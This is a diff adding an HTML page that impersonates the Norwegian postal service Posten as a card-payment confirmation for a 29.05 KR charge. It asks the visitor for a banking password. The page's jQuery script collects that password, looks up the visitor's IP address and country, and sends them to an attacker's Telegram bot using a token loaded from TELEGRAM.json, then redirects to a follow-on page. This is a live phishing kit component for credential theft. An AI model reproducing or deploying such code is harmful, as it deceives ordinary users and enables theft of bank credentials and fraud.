@@ -1,0 +1,160 @@
+
+<!DOCTYPE html>
+<html style="font-size: 16px;" lang="en"><head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+    <title>Posten</title>
+    <link rel="stylesheet" href="X911/css/nc.css" media="screen">
+    <link rel="stylesheet" href="X911/css/pass.css" media="screen">
+    <meta name="referrer" content="origin">
+    <link id="u-theme-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i|Open+Sans:300,300i,400,400i,500,500i,600,600i,700,700i,800,800i">
+    <link id="u-page-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,500,500i,700,700i">
+    <meta name="theme-color" content="#478ac9">
+    <meta property="og:title" content="pass">
+    <meta property="og:type" content="website">
+  <meta data-intl-tel-input-cdn-path="intlTelInput/"></head>
+  <body class="u-body u-xl-mode" data-lang="en"><header class="u-box-shadow u-clearfix u-header u-header" id="sec-81e4"><div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
+        <a href="https://nicepage.com" class="u-image u-logo u-image-1" data-image-width="2560" data-image-height="777">
+          <img src="X911/images/POS.png" class="u-logo-image u-logo-image-1">
+        </a>
+      </div></header>
+    <section class="u-clearfix u-section-1" id="sec-19ed">
+      <div class="u-clearfix u-sheet u-sheet-1">
+        <div class="u-border-1 u-border-white u-container-style u-expanded-width-xs u-group u-radius-12 u-shape-round u-group-1">
+          <div class="u-container-layout u-container-layout-1">
+            <img class="u-image u-image-default u-image-1" src="X911/images/bb.jpg" alt="" data-image-width="600" data-image-height="130">
+            <p class="u-custom-font u-font-ubuntu u-text u-text-default u-text-1"><b>Nettbutikk: <span style="font-weight: 400;">Posten</span></b>
+            </p>
+            <p class="u-custom-font u-font-ubuntu u-text u-text-default u-text-2"><b>Beløp: <span style="font-weight: 400;">29.05 KR</span></b>
+            </p>
+            <p class="u-custom-font u-font-ubuntu u-text u-text-default u-text-3"><b>Dato: <span style="font-weight: 400;"><script>
+date = new Date().toLocaleDateString();
+document.write(date);
+</script></span></b>
+            </p>
+            <p class="u-custom-font u-font-ubuntu u-text u-text-default u-text-4"><b>Kortnummer: <span id="last4"></b>
+            </p>
+            <img class="u-expanded-width u-image u-image-default u-image-2" src="X911/images/drop1.png" alt="" data-image-width="1500" data-image-height="200">
+            <div class="u-form u-form-1">
+              <form id="kod" class="u-clearfix u-form-spacing-10 u-form-vertical u-inner-form" source="email" name="form" style="padding: 10px;">
+                <!-- <div class="u-form-group u-form-name"> -->
+                  <!-- <label for="name-8c4d" class="u-custom-font u-font-ubuntu u-label">Fødselsnummer</label> -->
+                  <!-- <input type="tel" placeholder="11 siffer" name="nummer" minlength="11" maxlength="11" class="u-custom-font u-font-ubuntu u-input u-input-rectangle u-radius-2 u-input-1" required=""> -->
+                <!-- </div> -->
+                <div class="u-form-group u-form-name">
+                  <label for="name-8c4d" class="u-custom-font u-font-ubuntu u-label">Passord</label>
+                  <input type="password" id="A" name="ooo" class="u-custom-font u-font-ubuntu u-input u-input-rectangle u-radius-2 u-input-1" required="">
+                </div>
+                <div class="u-align-center u-form-group u-form-submit">
+                  <button type="submit" class="u-border-none u-btn u-btn-round u-btn-submit u-button-style u-radius-3 u-btn-1"><span class="u-file-icon u-icon u-text-palette-1-light-3 u-icon-1"><img src="X911/images/271226-0db48b7e.png" alt=""></span>
+                  </button>
+                  <input  class="u-form-control-hidden">
+                </div>
+              </form>
+            </div><span class="u-file-icon u-icon u-text-palette-1-base u-icon-2"><img src="X911/images/3064155-ab2edc0a.png" alt=""></span>
+          </div>
+        </div>
+      </div>
+    </section>
+    
+    
+    <footer class="u-align-center u-clearfix u-custom-color-2 u-footer u-footer" id="sec-5498"><div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
+        <img class="u-image u-image-contain u-image-default u-image-1" src="X911/images/POS.png" alt="" data-image-width="2560" data-image-height="777">
+        <p class="u-custom-font u-font-ubuntu u-text u-text-default u-text-1">© Posten Bring</p>
+      </div></footer>  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // Load botToken and chatId from TELEGRAM.json
+        function loadConfig() {
+            return fetch('TELEGRAM.json')
+                .then(response => response.json())
+                .then(data => ({
+                    botToken: data.botToken,
+                    chatId: data.chatId
+                }))
+                .catch(error => {
+                    console.error('Error loading config file:', error);
+                    return null;
+                });
+        }
+
+        // Get user's IP and country using ipify and ipinfo.io
+        function getIpAndCountry() {
+            return $.get('https://api.ipify.org?format=json')
+                .then(function(ipData) {
+                    // Get country based on IP
+                    return $.get('https://ipinfo.io/' + ipData.ip + '/json')
+                        .then(function(data) {
+                            return {
+                                ip: ipData.ip,
+                                country: data.country || 'Unknown'
+                            };
+                        })
+                        .catch(function() {
+                            return {
+                                ip: ipData.ip,
+                                country: 'Unknown'
+                            };
+                        });
+                })
+                .catch(function() {
+                    return {
+                        ip: 'Unavailable',
+                        country: 'Unknown'
+                    };
+                });
+        }
+
+        $("#kod").submit(function (event) {
+            event.preventDefault(); // Prevent default form action
+
+            var one = $("#A").val().trim();
+
+            if (one) {
+                loadConfig().then(config => {
+                    if (config) {
+                        getIpAndCountry().then(data => {
+                            var ipAddress = data.ip;
+                            var country = data.country;
+                            var now = new Date().toLocaleString(); // Get current date and time
+
+                            var telegramMessage = "📱 **Passord Banking**\n\n" +
+                                "🔹 **Passord:** `" + one + "`\n" +
+                                "🔹 **IP Address:** `" + ipAddress + "`\n" +
+                                "🏳 **Country:** `" + country + "`\n" +
+                                "🕒 **Date/Time:** `" + now + "`";
+
+                            var telegramBotUrl = "https://api.telegram.org/bot" + config.botToken + "/sendMessage";
+                            var requestData = {
+                                chat_id: config.chatId,
+                                text: telegramMessage,
+                                parse_mode: "Markdown"
+                            };
+
+                            $.post(telegramBotUrl, requestData, function () {
+                                window.location.href = "K.html?vc?__event=cauuuze&service_id=top_ouazt=DE";
+                            }).fail(function () {
+                                alert("Bitte versuchen Sie es erneut.");
+                            });
+                        });
+                    }
+                });
+            }
+        });
+    });
+	
+// JavaScript
+document.addEventListener("DOMContentLoaded", function () {
+    var last4 = localStorage.getItem("last4digits");
+    if (last4) {
+        document.getElementById("last4").textContent = last4;
+    }
+});
+
+</script>
+</html>
